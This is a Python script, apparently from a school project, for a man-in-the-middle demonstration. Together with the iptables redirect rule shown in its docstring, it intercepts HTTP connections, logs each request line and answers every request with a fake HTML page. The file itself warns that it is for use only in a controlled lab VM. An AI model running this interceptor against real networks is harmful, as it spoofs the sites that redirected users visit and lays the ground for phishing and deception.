#!/usr/bin/env python3
"""
HTTP Interceptor Proxy for MITM Demonstration
School Project - Use only on your own network in a controlled VM environment.

This script runs a transparent HTTP proxy that intercepts requests headed to
the target server and responds with a fake HTML page instead.

It is designed to work with iptables traffic redirection:
    iptables -t nat -A PREROUTING -p tcp --dport 8000 -j REDIRECT --to-port 8080
"""

import argparse
import socket
import threading
import os


def load_fake_page(path):
    """Load the fake HTML page from disk."""
    with open(path, "r") as f:
        return f.read()


def build_http_response(body):
    """Build a proper HTTP/1.1 200 response with the given HTML body."""
    body_bytes = body.encode("utf-8")
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=UTF-8\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return response.encode("utf-8") + body_bytes


def handle_client(client_sock, client_addr, fake_page):
    """Handle a single intercepted HTTP connection."""
    try:
        # Receive the HTTP request (we don't actually need to parse it)
        request = client_sock.recv(4096)
        if not request:
            client_sock.close()
            return

        # Log the intercepted request
        first_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
        print(f"[+] Intercepted from {client_addr[0]}:{client_addr[1]} -> {first_line}")

        # Send back the fake page regardless of what was requested
        response = build_http_response(fake_page)
        client_sock.sendall(response)
        print(f"    -> Injected fake page ({len(fake_page)} bytes)")

    except Exception as e:
        print(f"[!] Error handling {client_addr}: {e}")
    finally:
        client_sock.close()


def main():
    parser = argparse.ArgumentParser(description="HTTP Interceptor Proxy for MITM Demo")
    parser.add_argument("--port", type=int, default=8080,
                        help="Port to listen on (default: 8080)")
    parser.add_argument("--fake-page", default="fake_index.html",
                        help="Path to fake HTML file (default: fake_index.html)")
    args = parser.parse_args()

    # Resolve the fake page path relative to this script's directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    fake_page_path = os.path.join(script_dir, args.fake_page)

    if not os.path.exists(fake_page_path):
        # Fall back to the raw argument in case it's an absolute path
        fake_page_path = args.fake_page

    fake_page = load_fake_page(fake_page_path)
    print(f"[+] Loaded fake page from: {fake_page_path}")
    print(f"[+] Fake page size: {len(fake_page)} bytes")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", args.port))
    server.listen(10)

    print(f"[*] HTTP interceptor listening on port {args.port}")
    print(f"[*] Waiting for redirected connections...")
    print()

    try:
        while True:
            client_sock, client_addr = server.accept()
            t = threading.Thread(target=handle_client,
                                 args=(client_sock, client_addr, fake_page))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down interceptor.")
        server.close()


if __name__ == "__main__":
    main()
